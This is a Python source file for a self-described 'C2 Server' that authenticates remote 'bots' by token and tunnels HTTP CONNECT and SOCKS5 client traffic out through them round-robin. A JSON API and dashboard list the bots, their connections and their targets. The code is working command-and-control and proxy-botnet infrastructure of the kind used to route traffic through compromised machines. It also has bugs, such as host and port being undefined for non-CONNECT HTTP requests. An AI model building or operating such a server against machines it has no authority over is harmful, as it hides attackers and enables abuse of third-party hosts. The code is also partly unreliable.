#!/usr/bin/env python3
"""
C2 Server with improved structure and modular design.
"""

import asyncio
import ssl
import logging
import uuid
import json
import os
import signal
import sys
import time
from typing import Dict, Tuple, Optional

# Add project root to Python path for direct execution
if __name__ == "__main__":
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from core.protocol import Frame, FramedStream, Heartbeat
from core.utils.config import load_config, validate_config
from core.utils.logging import setup_logging, get_logger
from features.monitoring.health_check import HealthChecker
from features.monitoring.web_dashboard import WebDashboard

logger = get_logger("c2")


class BotSession:
    def __init__(self, bot_id: str, stream: FramedStream, config: dict):
        self.bot_id = bot_id
        self.stream = stream
        self.active: Dict[str, dict] = {}  # request_id -> connection info
        self.heartbeat: Optional[Heartbeat] = None
        
        # Setup heartbeat
        heartbeat_interval = config["heartbeat"]["interval"]
        heartbeat_timeout = config["heartbeat"]["timeout"]
        self.heartbeat = Heartbeat(
            stream, 
            interval=heartbeat_interval, 
            timeout=heartbeat_timeout,
            name=f"bot-{bot_id}"
        )

    async def start(self):
        """Start the bot session."""
        if self.heartbeat:
            await self.heartbeat.start()

    async def stop(self):
        """Stop the bot session."""
        if self.heartbeat:
            await self.heartbeat.stop()


class C2Server:
    def __init__(self, config_file: str = "config/config.json"):
        # Load configuration
        self.config = load_config(config_file)
        if not validate_config(self.config):
            raise ValueError("Invalid configuration")
        
        # Setup logging
        setup_logging(
            level=self.config["logging"]["level"],
            format_string=self.config["logging"]["format"]
        )
        
        # Server settings
        self.host = self.config["server"]["host"]
        self.bot_port = self.config["server"]["bot_port"]
        self.http_port = self.config["server"]["http_port"]
        self.socks_port = self.config["server"]["socks_port"]
        self.api_port = self.config["server"]["api_port"]
        
        # Security settings
        self.bot_token = self.config["security"]["bot_token"]
        self.tls_enabled = self.config["security"]["tls_enabled"]
        self.certfile = self.config["security"]["certfile"]
        self.keyfile = self.config["security"]["keyfile"]
        
        # Setup TLS if enabled
        self.ssl_ctx: Optional[ssl.SSLContext] = None
        if self.tls_enabled:
            if os.path.exists(self.certfile) and os.path.exists(self.keyfile):
                ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                ctx.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
                self.ssl_ctx = ctx
                logger.info("TLS enabled with cert: %s, key: %s", self.certfile, self.keyfile)
            else:
                logger.warning("TLS enabled but cert/key files not found: %s, %s", self.certfile, self.keyfile)
        
        # Bot management
        self.bots: Dict[str, BotSession] = {}
        self.preferred_bot: Optional[str] = None
        self._rr_keys = []
        self._rr_idx = 0
        
        # Network settings
        self.buffer_size = self.config["network"]["buffer_size"]
        self.read_timeout = self.config["network"]["read_timeout"]
        self.write_timeout = self.config["network"]["write_timeout"]
        self.connect_timeout = self.config["network"]["connect_timeout"]
        
        # Shutdown handling
        self._shutdown_event = asyncio.Event()
        self._servers = []
        self._tasks = []
        
        # Connection limits
        self.max_bots = self.config["limits"]["max_bots"]
        self.max_connections_per_bot = self.config["limits"]["max_connections_per_bot"]
        self.connection_timeout = self.config["limits"]["connection_timeout"]
        
        # Connection tracking
        self._total_connections = 0
        self._connection_counts = {}  # bot_id -> count
        
        # Initialize features
        self.health_checker = HealthChecker(self)
        self.web_dashboard = WebDashboard(self)

    def _next_bot(self) -> Optional[BotSession]:
        if not self.bots:
            return None
        if self.preferred_bot and self.preferred_bot in self.bots:
            return self.bots[self.preferred_bot]
        if not self._rr_keys:
            self._rr_keys = list(self.bots.keys())
            self._rr_idx = 0
        bot_id = self._rr_keys[self._rr_idx % len(self._rr_keys)]
        self._rr_idx += 1
        return self.bots.get(bot_id)

    def _can_accept_bot(self) -> bool:
        """Check if we can accept a new bot connection."""
        return len(self.bots) < self.max_bots

    def _can_accept_connection(self, bot_id: str) -> bool:
        """Check if a bot can accept a new connection."""
        if bot_id not in self.bots:
            return False
        current_count = self._connection_counts.get(bot_id, 0)
        return current_count < self.max_connections_per_bot

    def _increment_connection_count(self, bot_id: str) -> bool:
        """Increment connection count for a bot. Returns True if successful."""
        if not self._can_accept_connection(bot_id):
            return False
        self._connection_counts[bot_id] = self._connection_counts.get(bot_id, 0) + 1
        self._total_connections += 1
        return True

    def _decrement_connection_count(self, bot_id: str):
        """Decrement connection count for a bot."""
        if bot_id in self._connection_counts:
            self._connection_counts[bot_id] = max(0, self._connection_counts[bot_id] - 1)
            self._total_connections = max(0, self._total_connections - 1)
            if self._connection_counts[bot_id] == 0:
                del self._connection_counts[bot_id]

    def _get_connection_stats(self) -> dict:
        """Get current connection statistics."""
        return {
            "total_connections": self._total_connections,
            "max_bots": self.max_bots,
            "current_bots": len(self.bots),
            "max_connections_per_bot": self.max_connections_per_bot,
            "bot_connections": dict(self._connection_counts)
        }

    async def serve(self):
        """Start the C2 server with graceful shutdown support."""
        # Setup signal handlers
        self._setup_signal_handlers()

        # Start servers
        bot_server = await asyncio.start_server(
            self._handle_bot, self.host, self.bot_port, ssl=self.ssl_ctx
        )
        http_server = await asyncio.start_server(
            self._handle_http_client, self.host, self.http_port
        )
        socks_server = await asyncio.start_server(
            self._handle_socks_client, self.host, self.socks_port
        )
        api_server = await asyncio.start_server(
            self._handle_api_client, self.host, self.api_port
        )

        self._servers = [bot_server, http_server, socks_server, api_server]

        logger.info("🚀 C2 Server starting...")
        logger.info("📡 Bot port: %s:%d", self.host, self.bot_port)
        logger.info("🌐 HTTP proxy: %s:%d", self.host, self.http_port)
        logger.info("🔌 SOCKS5 proxy: %s:%d", self.host, self.socks_port)
        logger.info("📊 API/Web UI: %s:%d", self.host, self.api_port)
        logger.info("Press Ctrl+C to shutdown gracefully")

        try:
            # Start server tasks
            server_tasks = [
                asyncio.create_task(server.serve_forever(), name=f"server-{i}")
                for i, server in enumerate(self._servers)
            ]
            self._tasks.extend(server_tasks)

            # Wait for shutdown signal
            await self._shutdown_event.wait()

        except KeyboardInterrupt:
            logger.info("Received keyboard interrupt")
        except Exception as e:
            logger.error("Server error: %s", e)
        finally:
            await self._cleanup()

    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            logger.info("Received signal %d, initiating shutdown...", signum)
            self._shutdown_event.set()

        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        if hasattr(signal, 'SIGBREAK'):  # Windows
            signal.signal(signal.SIGBREAK, signal_handler)

    async def _cleanup(self):
        """Cleanup resources during shutdown."""
        logger.info("Starting cleanup...")
        
        # Cancel all tasks
        for task in self._tasks:
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass

        # Close all servers
        for server in self._servers:
            server.close()
            await server.wait_closed()

        # Close all bot connections
        for bot_id, session in list(self.bots.items()):
            logger.info("Closing bot connection: %s", bot_id)
            try:
                if session.heartbeat:
                    await session.heartbeat.stop()
                session.stream.close()
            except Exception as e:
                logger.warning("Error closing bot %s: %s", bot_id, e)

        self.bots.clear()
        logger.info("Cleanup completed")

    async def _handle_bot(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle bot connections."""
        peer = writer.get_extra_info("peername")
        stream = FramedStream(reader, writer)
        logger.info("Bot connected from %s", peer)
        
        # Check bot limit before authentication
        if not self._can_accept_bot():
            logger.warning("Bot limit exceeded (%d/%d), rejecting connection from %s", 
                         len(self.bots), self.max_bots, peer)
            await stream.send(Frame(type="ERR", meta={"reason": "bot_limit_exceeded"}))
            stream.close()
            return
        
        # Expect AUTH
        auth = await stream.recv(timeout=10)
        if not auth or auth.type != "AUTH" or not auth.meta or auth.meta.get("token") != self.bot_token:
            logger.warning("Bot auth failed from %s", peer)
            await stream.send(Frame(type="ERR", meta={"reason": "auth_failed"}))
            stream.close()
            return
        
        bot_id = auth.meta.get("bot_id") or str(peer)
        
        # Check if bot already exists (reconnection)
        if bot_id in self.bots:
            logger.info("Bot %s reconnecting, closing old connection", bot_id)
            old_session = self.bots[bot_id]
            if old_session.heartbeat:
                await old_session.heartbeat.stop()
            old_session.stream.close()
        
        session = BotSession(bot_id, stream, self.config)
        self.bots[bot_id] = session
        self._rr_keys = list(self.bots.keys())
        await session.start()
        await stream.send(Frame(type="OK", meta={"msg": "AUTH_OK"}))
        logger.info("Bot %s authenticated successfully", bot_id)

        try:
            while True:
                frame = await stream.recv()
                if frame is None:
                    break
                
                if frame.type == "DATA":
                    req_id = frame.request_id
                    info = session.active.get(req_id)
                    if info:
                        try:
                            w = info.get("writer")
                            if w:
                                await w.write(frame.payload)
                                await w.drain()
                        except (ConnectionResetError, BrokenPipeError, OSError) as e:
                            logger.warning("client write error: %s", e)
                        except Exception as e:
                            logger.error("unexpected client write error: %s", e)
                elif frame.type == "END":
                    req_id = frame.request_id
                    info = session.active.pop(req_id, None)
                    if info:
                        # Decrement connection count
                        self._decrement_connection_count(bot_id)
                        try:
                            w = info.get("writer")
                            if w:
                                w.close()
                        except (ConnectionResetError, BrokenPipeError, OSError) as e:
                            logger.debug("client close error: %s", e)
                        except Exception as e:
                            logger.warning("unexpected client close error: %s", e)
                else:
                    logger.debug("unhandled bot frame: %s", frame.type)

        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            logger.warning("bot session connection error: %s", e)
        except asyncio.CancelledError:
            logger.info("bot session cancelled: %s", bot_id)
            raise
        except Exception as e:
            logger.error("unexpected bot session error: %s", e)
        finally:
            logger.info("Bot disconnected: %s", bot_id)
            # Cleanup connection counts
            if bot_id in self._connection_counts:
                self._total_connections -= self._connection_counts[bot_id]
                del self._connection_counts[bot_id]
            self.bots.pop(bot_id, None)
            self._rr_keys = list(self.bots.keys())
            stream.close()

    async def _handle_http_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle HTTP proxy clients."""
        peer = writer.get_extra_info("peername")
        bot = self._next_bot()
        if not bot:
            logger.warning("No available bots for HTTP request from %s", peer)
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            await writer.drain()
            writer.close()
            return
        
        # Check connection limit for the selected bot
        if not self._can_accept_connection(bot.bot_id):
            logger.warning("Bot %s connection limit exceeded (%d/%d), rejecting HTTP request from %s", 
                         bot.bot_id, self._connection_counts.get(bot.bot_id, 0), 
                         self.max_connections_per_bot, peer)
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            await writer.drain()
            writer.close()
            return

        # Peek request with timeout
        try:
            req = await asyncio.wait_for(reader.read(self.buffer_size), timeout=self.read_timeout)
        except asyncio.TimeoutError:
            logger.warning("HTTP client read timeout from %s", peer)
            writer.close()
            return

        if not req:
            writer.close()
            return

        req_id = str(uuid.uuid4())
        first = req.split(b"\r\n")[0]
        
        if first.startswith(b"CONNECT"):
            # HTTPS tunnel
            host_port = first.split(b" ")[1].decode()
            if ":" in host_port:
                host, port = host_port.split(":", 1)
                port = int(port)
            else:
                host, port = host_port, 443
            try:
                # Tell client tunnel is established
                writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n")
                await writer.drain()
            except Exception as e:
                logger.error("unexpected host parsing error: %s", e)
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")
                await writer.drain()
                writer.close()
                return
        
        # Increment connection count
        if not self._increment_connection_count(bot.bot_id):
            logger.warning("Failed to increment connection count for bot %s", bot.bot_id)
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            await writer.drain()
            writer.close()
            return
        
        # Request bot to open upstream
        await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
        # Track connection meta
        bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}

        # Pipe client->bot
        async def pump_client():
            try:
                while True:
                    chunk = await reader.read(self.buffer_size)
                    if not chunk:
                        break
                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.debug("client->bot pump error: %s", e)
            except Exception as e:
                logger.warning("unexpected client->bot pump error: %s", e)
            finally:
                await bot.stream.send(Frame(type="END", request_id=req_id))

        asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")

    async def _handle_socks_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle SOCKS5 proxy clients."""
        peer = writer.get_extra_info("peername")
        bot = self._next_bot()
        if not bot:
            logger.warning("No available bots for SOCKS request from %s", peer)
            writer.close()
            return
        
        # Check connection limit for the selected bot
        if not self._can_accept_connection(bot.bot_id):
            logger.warning("Bot %s connection limit exceeded (%d/%d), rejecting SOCKS request from %s", 
                         bot.bot_id, self._connection_counts.get(bot.bot_id, 0), 
                         self.max_connections_per_bot, peer)
            writer.close()
            return

        # SOCKS5 handshake
        data = await reader.readexactly(2)
        nmethods = data[1]
        await reader.readexactly(nmethods)  # methods
        writer.write(b"\x05\x00")
        await writer.drain()
        
        # SOCKS5 request
        req = await reader.readexactly(4)
        if req[1] != 1:  # CONNECT
            writer.close()
            return
        
        # Parse address
        if req[3] == 1:  # IPv4
            host = ".".join(str(b) for b in await reader.readexactly(4))
        elif req[3] == 3:  # Domain
            ln = (await reader.readexactly(1))[0]
            host = (await reader.readexactly(ln)).decode()
        else:
            writer.close()
            return
        
        port = int.from_bytes(await reader.readexactly(2), "big")
        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        await writer.drain()
        
        req_id = str(uuid.uuid4())
        
        # Increment connection count
        if not self._increment_connection_count(bot.bot_id):
            logger.warning("Failed to increment connection count for bot %s", bot.bot_id)
            writer.close()
            return
        
        bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
        await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))

        # Pipe client->bot
        async def pump_client():
            try:
                while True:
                    chunk = await reader.read(self.buffer_size)
                    if not chunk:
                        break
                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.debug("client->bot pump error: %s", e)
            except Exception as e:
                logger.warning("unexpected client->bot pump error: %s", e)
            finally:
                await bot.stream.send(Frame(type="END", request_id=req_id))

        asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")

    async def _handle_api_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle API and web dashboard clients."""
        peer = writer.get_extra_info("peername")
        
        try:
            # Read request with timeout
            req = await asyncio.wait_for(reader.read(self.buffer_size), timeout=self.read_timeout)
            if not req:
                writer.close()
                return

            # Parse HTTP request
            lines = req.split(b"\r\n")
            if not lines:
                writer.close()
                return

            first_line = lines[0].decode()
            parts = first_line.split()
            if len(parts) < 3:
                writer.close()
                return

            method, path, version = parts[0], parts[1], parts[2]

            # Helper function for JSON responses
            def json_response(data, status="200 OK"):
                body = json.dumps(data, indent=2).encode()
                hdr = (
                    f"HTTP/1.1 {status}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Access-Control-Allow-Origin: *\r\n\r\n"
                ).encode()
                return hdr + body

            # API endpoints
            if method == "GET" and path == "/api/status":
                stats = self._get_connection_stats()
                health = self.health_checker.get_health_status()
                resp = {
                    "host": self.host,
                    "ports": {"bot": self.bot_port, "http": self.http_port, "socks": self.socks_port, "api": self.api_port},
                    "bots": list(self.bots.keys()),
                    "preferred_bot": self.preferred_bot,
                    "bot_count": len(self.bots),
                    "active_connections": stats["total_connections"],
                    "connection_limits": {
                        "max_bots": stats["max_bots"],
                        "max_connections_per_bot": stats["max_connections_per_bot"],
                        "current_bots": stats["current_bots"]
                    },
                    "bot_connections": stats["bot_connections"],
                    "health": health
                }
                writer.write(json_response(resp))
            elif method == "GET" and path == "/api/bots":
                bots = []
                for bid, sess in self.bots.items():
                    bots.append({
                        "bot_id": bid,
                        "active_requests": len(sess.active),
                        "heartbeat_status": "active" if sess.heartbeat else "inactive"
                    })
                writer.write(json_response({"bots": bots}))
            elif method == "GET" and path == "/api/connections":
                connections = []
                for bid, sess in self.bots.items():
                    for req_id, info in sess.active.items():
                        connections.append({
                            "request_id": req_id,
                            "bot_id": bid,
                            "target": f"{info['host']}:{info['port']}",
                            "client": str(info['client'])
                        })
                writer.write(json_response({"connections": connections}))
            elif method == "POST" and path == "/api/select_bot":
                # Parse JSON body
                body = b""
                for line in lines[1:]:
                    if line == b"":
                        break
                    if line.startswith(b"Content-Length:"):
                        length = int(line.split(b":")[1].strip())
                        body = await reader.read(length)
                        break
                
                try:
                    data = json.loads(body.decode())
                    bid = data.get("bot_id")
                    if bid and bid in self.bots:
                        self.preferred_bot = bid
                        writer.write(json_response({"ok": True, "preferred_bot": bid}))
                    else:
                        writer.write(json_response({"ok": False, "error": "invalid_bot"}, status="400 Bad Request"))
                except json.JSONDecodeError:
                    writer.write(json_response({"ok": False, "error": "invalid_json"}, status="400 Bad Request"))
            elif method == "POST" and path == "/api/clear_preferred_bot":
                self.preferred_bot = None
                writer.write(json_response({"ok": True}))
            elif method == "GET" and path == "/health":
                # Simple health check endpoint
                health = self.health_checker.get_health_status()
                if health["status"] == "healthy":
                    writer.write(json_response(health, status="200 OK"))
                elif health["status"] == "warning":
                    writer.write(json_response(health, status="200 OK"))
                else:  # degraded
                    writer.write(json_response(health, status="503 Service Unavailable"))
            elif method == "GET" and path == "/health/detailed":
                # Detailed health check endpoint
                health = self.health_checker.get_health_status()
                writer.write(json_response(health, status="200 OK"))
            elif method == "GET" and path == "/health/ready":
                # Kubernetes readiness probe
                if len(self.bots) > 0:
                    writer.write(json_response({"status": "ready", "bots": len(self.bots)}, status="200 OK"))
                else:
                    writer.write(json_response({"status": "not_ready", "bots": 0}, status="503 Service Unavailable"))
            elif method == "GET" and path == "/health/live":
                # Kubernetes liveness probe
                writer.write(json_response({"status": "alive", "uptime": time.time() - self.health_checker._start_time}, status="200 OK"))
            else:
                # Serve web dashboard
                if path == "/" or path == "/index.html":
                    html = self.web_dashboard.get_dashboard_html()
                    body = html.encode()
                    hdr = (
                        f"HTTP/1.1 200 OK\r\n"
                        f"Content-Type: text/html\r\n"
                        f"Content-Length: {len(body)}\r\n\r\n"
                    ).encode()
                    writer.write(hdr + body)
                elif path == "/static/dashboard.js":
                    js = self.web_dashboard.get_dashboard_js()
                    body = js.encode()
                    hdr = (
                        f"HTTP/1.1 200 OK\r\n"
                        f"Content-Type: application/javascript\r\n"
                        f"Content-Length: {len(body)}\r\n\r\n"
                    ).encode()
                    writer.write(hdr + body)
                else:
                    # 404 Not Found
                    body = b"404 Not Found"
                    hdr = (
                        f"HTTP/1.1 404 Not Found\r\n"
                        f"Content-Type: text/plain\r\n"
                        f"Content-Length: {len(body)}\r\n\r\n"
                    ).encode()
                    writer.write(hdr + body)

        except asyncio.TimeoutError:
            logger.warning("API client read timeout from %s", peer)
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            logger.debug("API client connection error: %s", e)
        except Exception as e:
            logger.error("unexpected API client error: %s", e)
        finally:
            writer.close()


async def main():
    """Main entry point for C2 server."""
    import argparse
    
    parser = argparse.ArgumentParser(description="C2 Server with improved structure")
    parser.add_argument("--config", default="config/config.json", help="Config file path")
    parser.add_argument("--host", help="Override host")
    parser.add_argument("--bot-port", type=int, help="Override bot port")
    parser.add_argument("--http-port", type=int, help="Override HTTP port")
    parser.add_argument("--socks-port", type=int, help="Override SOCKS port")
    parser.add_argument("--api-port", type=int, help="Override API port")
    parser.add_argument("--bot-token", help="Override bot token")
    parser.add_argument("--tls-enabled", action="store_true", help="Enable TLS")
    parser.add_argument("--certfile", help="TLS certificate file")
    parser.add_argument("--keyfile", help="TLS key file")
    
    args = parser.parse_args()
    
    try:
        server = C2Server(args.config)
        
        # Apply command line overrides
        if args.host:
            server.host = args.host
        if args.bot_port:
            server.bot_port = args.bot_port
        if args.http_port:
            server.http_port = args.http_port
        if args.socks_port:
            server.socks_port = args.socks_port
        if args.api_port:
            server.api_port = args.api_port
        if args.bot_token:
            server.bot_token = args.bot_token
        if args.tls_enabled:
            server.tls_enabled = True
        if args.certfile:
            server.certfile = args.certfile
        if args.keyfile:
            server.keyfile = args.keyfile
        
        await server.serve()
        
    except KeyboardInterrupt:
        logger.info("Shutdown requested by user")
    except Exception as e:
        logger.error("Fatal error: %s", e)
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
